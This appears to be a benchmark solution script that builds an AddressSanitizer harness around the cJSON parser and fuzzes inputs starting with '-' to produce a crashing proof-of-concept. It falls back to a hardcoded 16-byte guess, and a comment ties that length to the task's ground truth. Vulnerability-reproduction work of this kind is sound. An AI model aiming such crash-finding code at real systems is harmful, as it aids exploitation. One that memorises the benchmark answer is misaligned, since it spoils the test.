import os
import tarfile
import subprocess
import tempfile
import random
import shutil

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        Args:
            src_path: Path to the vulnerable source code tarball
            
        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        with tempfile.TemporaryDirectory() as temp_dir:
            # Extract the source code
            try:
                with tarfile.open(src_path) as tar:
                    tar.extractall(path=temp_dir)
            except Exception:
                pass

            # Locate cJSON source file
            cjson_src = None
            include_dir = temp_dir
            for root, dirs, files in os.walk(temp_dir):
                if "cJSON.c" in files:
                    cjson_src = os.path.join(root, "cJSON.c")
                    include_dir = root
                    break
            
            # Fallback if cJSON.c is not found
            if cjson_src is None:
                return b"-" + b"0" * 15

            # Create a harness to run cJSON_Parse
            harness_path = os.path.join(temp_dir, "harness.c")
            with open(harness_path, "w") as f:
                f.write(r"""
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "cJSON.h"

int main(int argc, char **argv) {
    if (argc < 2) return 0;
    FILE *f = fopen(argv[1], "rb");
    if (!f) return 0;
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    fseek(f, 0, SEEK_SET);
    
    char *data = (char *)malloc(fsize + 1);
    if (!data) { fclose(f); return 0; }
    fread(data, 1, fsize, f);
    data[fsize] = 0;
    fclose(f);

    // Trigger parsing
    cJSON *json = cJSON_Parse(data);
    if (json) cJSON_Delete(json);
    
    free(data);
    return 0;
}
""")

            # Compile the harness with AddressSanitizer
            exe_path = os.path.join(temp_dir, "poc_runner")
            compiler = "clang" if shutil.which("clang") else "gcc"
            
            cmd = [
                compiler,
                "-g",
                "-O0",
                "-fsanitize=address",
                "-I", include_dir,
                cjson_src,
                harness_path,
                "-o", exe_path,
                "-lm"
            ]
            
            try:
                subprocess.check_call(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception:
                # If compilation fails, return a best guess
                return b"-" + b"0" * 15

            # Fuzzing loop to find the crash
            input_path = os.path.join(temp_dir, "fuzz_input")
            
            # Seeds focus on the vulnerability description: leading minus, infinity parsing
            seeds = [
                b"-",
                b"-I",
                b"-In",
                b"-Infinity",
                b"-0",
                b"-1",
            ]
            
            # Charset relevant to numbers and the bug
            charset = b"0123456789.eE+-Infty"
            
            # Limit iterations to run quickly within environment constraints
            for i in range(3000):
                if i < len(seeds):
                    payload = seeds[i]
                else:
                    # Construct random payload starting with '-'
                    # Ground truth is 16 bytes, so we bias towards that length
                    if random.random() < 0.4:
                        length = 16
                    else:
                        length = random.randint(2, 65)
                    
                    payload = bytearray(b"-")
                    for _ in range(length - 1):
                        payload.append(random.choice(charset))
                    payload = bytes(payload)
                
                # Write payload
                with open(input_path, "wb") as f:
                    f.write(payload)
                
                try:
                    # Run the runner
                    proc = subprocess.run(
                        [exe_path, input_path],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.PIPE,
                        timeout=0.2
                    )
                    
                    # Check for ASAN crash
                    if proc.returncode != 0:
                        # Usually ASAN exits with non-zero code. 
                        # We verify stderr contains ASAN report or assume segfault/abort is valid.
                        if b"AddressSanitizer" in proc.stderr or proc.returncode == -11: # SIGSEGV
                            return payload
                except Exception:
                    continue
            
            # Default return if fuzzing fails
            return b"-" + b"0" * 15